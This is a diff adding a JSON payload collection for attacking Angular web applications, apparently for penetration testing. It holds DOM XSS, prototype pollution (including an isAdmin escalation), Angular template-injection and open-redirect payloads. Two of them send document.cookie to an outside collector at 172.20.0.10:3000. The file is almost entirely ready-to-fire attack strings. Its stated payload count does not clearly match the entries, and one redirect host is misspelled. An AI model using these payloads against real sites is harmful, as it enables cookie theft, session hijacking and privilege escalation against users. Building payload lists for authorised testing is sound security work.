@@ -1,0 +1,75 @@
+{
+  "payloads": {
+    "dom_xss": {
+      "description": "Пейлоады для DOM XSS через innerHTML / bypassSecurityTrust",
+      "entries": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<script>alert(1)</script>",
+        "javascript:alert(1)",
+        "<img src=x onerror=fetch('http://172.20.0.10:3000/?xss='+document.cookie)>",
+        "{{constructor.constructor('alert(1)')()}}",
+        "<input onfocus=eval('alert(1)') autofocus>",
+        "<body onload=alert(1)>",
+        "<details open ontoggle=alert(1)>"
+      ]
+    },
+    "prototype_pollution": {
+      "description": "Пейлоады для Client-Side Prototype Pollution",
+      "entries": [
+        {"__proto__": {"polluted": "true"}},
+        {"constructor": {"prototype": {"polluted": "true"}}},
+        {"__proto__": {"isAdmin": true}},
+        {"__proto__": {"__proto__": {"polluted": "true"}}},
+        {"__proto__.polluted": "true"},
+        {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+      ]
+    },
+    "angular_template_injection": {
+      "description": "Angular Template Injection (AST Injection) пейлоады",
+      "entries": [
+        "{{constructor.constructor('return this')()}}",
+        "{{constructor.constructor('alert(1)')()}}",
+        "{{1+constructor.constructor('return fetch(\"http://172.20.0.10:3000/?data=\"+document.cookie)')()}}",
+        "{{_context.constructor.constructor('return this')()}}",
+        "{{a=constructor.constructor('return this'),a()}}",
+        "{{$eval.constructor('return this')()}}",
+        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } } ;alert(1)//');}}"
+      ]
+    },
+    "open_redirect": {
+      "description": "Пейлоады для Open Redirect / Path Traversal",
+      "entries": [
+        "javascript:alert(1)",
+        "//evil.com/",
+        "https://evil.com/redirect",
+        "///evil.com",
+        "../..//evil.com/",
+        "%2Feval.com",
+        "////evil.com"
+      ]
+    },
+    "http_headers": {
+      "description": "Заголовки для проверки security-конфигурации",
+      "headers": {
+        "expected": ["X-Content-Type-Options: nosniff", "X-Frame-Options: DENY", "Content-Security-Policy", "Set-Cookie: *HttpOnly", "Set-Cookie: *SameSite=Strict"]
+      }
+    },
+    "observables": {
+      "description": "Строки для поиска утечек через Observable/EventEmitter",
+      "entries": [
+        "EventEmitter.emit",
+        "Subject.next",
+        "BehaviorSubject.next",
+        "ReplaySubject.next",
+        "async |"
+      ]
+    }
+  },
+  "meta": {
+    "version": "1.0",
+    "target": "Angular applications via HTTP",
+    "total_payloads": 32,
+    "created": "2026-09-10"
+  }
+}
